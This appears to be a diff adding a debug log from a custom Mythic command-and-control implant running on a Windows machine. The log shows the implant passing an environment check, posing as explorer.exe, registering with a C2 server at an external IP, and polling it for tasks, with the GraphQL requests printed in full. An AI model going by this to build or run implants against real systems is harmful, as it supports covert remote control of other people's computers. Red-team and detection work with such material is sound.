@@ -1,0 +1,57 @@
+[2025-06-16 19:14:11] === PHANTOM MYTHIC JWT AGENT STARTING ===
+[2025-06-16 19:14:11] Running on: windows amd64
+[2025-06-16 19:14:11] Process ID: 12204
+[2025-06-16 19:14:11] Mythic URL: https://37.27.249.191:7443/graphql/
+[2025-06-16 19:14:11] Starting environment detection...
+[2025-06-16 19:14:13] System manufacturer: manufacturer  
+
+alienware     
+
+
+
+
+[2025-06-16 19:14:13] CPU count: 16
+[2025-06-16 19:14:13] Environment check passed
+[2025-06-16 19:14:13] Environment check passed - proceeding
+[2025-06-16 19:14:13] Initial delay: 14s
+[2025-06-16 19:14:27] Attempting Mythic registration...
+[2025-06-16 19:14:27] Starting Mythic registration via GraphQL...
+[2025-06-16 19:14:27] Generated UUID: phantom-1750097667-DESKTOP-I9TMHGK
+[2025-06-16 19:14:27] Hostname: DESKTOP-I9TMHGK
+[2025-06-16 19:14:27] Username: micka
+[2025-06-16 19:14:27] Executing GraphQL query: mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
+                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
+                        status
+                        error
+                }
+        }
+[2025-06-16 19:14:27] Request payload: {"query":"mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {\n                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {\n                        status\n                        error\n                }\n        }","variables":{"newCallback":{"description":"Phantom C2 Agent","domain":"","externalIp":"127.0.0.1","extraInfo":"OS:windows ARCH:amd64 PID:12204","host":"DESKTOP-I9TMHGK","ip":"127.0.0.1","processName":"explorer.exe","sleepInfo":"5s","user":"micka"},"payloadUuid":"phantom-1750097667-DESKTOP-I9TMHGK"}}
+[2025-06-16 19:14:27] Sending request to: https://37.27.249.191:7443/graphql/
+[2025-06-16 19:14:27] Response status: 200
+[2025-06-16 19:14:27] Response body: {"data":{"createCallback":{"status":"error","error":"sql: no rows in result set"}}}
+[2025-06-16 19:14:27] GraphQL request successful
+[2025-06-16 19:14:27] Registration successful
+[2025-06-16 19:14:27] Response data: map[createCallback:map[error:sql: no rows in result set status:error]]
+[2025-06-16 19:14:27] Registration completed successfully
+[2025-06-16 19:14:27] Starting main loop...
+[2025-06-16 19:14:27] Loop iteration 1
+[2025-06-16 19:14:27] Checking for tasks via GraphQL...
+[2025-06-16 19:14:27] Executing GraphQL query: query getCallbackTasks($agent_callback_id: String!) {
+                callback(where: {agent_callback_id: {_eq: $agent_callback_id}}) {
+                        id
+                        agent_callback_id
+                        tasks(where: {status: {_eq: "submitted"}}) {
+                                id
+                                command_name
+                                params
+                                status
+                        }
+                }
+        }
+[2025-06-16 19:14:27] Request payload: {"query":"query getCallbackTasks($agent_callback_id: String!) {\n                callback(where: {agent_callback_id: {_eq: $agent_callback_id}}) {\n                        id\n                        agent_callback_id\n                        tasks(where: {status: {_eq: \"submitted\"}}) {\n                                id\n                                command_name\n                                params\n                                status\n                        }\n                }\n        }","variables":{"agent_callback_id":"phantom-1750097667-DESKTOP-I9TMHGK"}}
+[2025-06-16 19:14:27] Sending request to: https://37.27.249.191:7443/graphql/
+[2025-06-16 19:14:27] Response status: 200
+[2025-06-16 19:14:27] Response body: {"data":{"callback":[]}}
+[2025-06-16 19:14:27] GraphQL request successful
+[2025-06-16 19:14:27] No tasks received
+[2025-06-16 19:14:27] Sleeping for: 8s
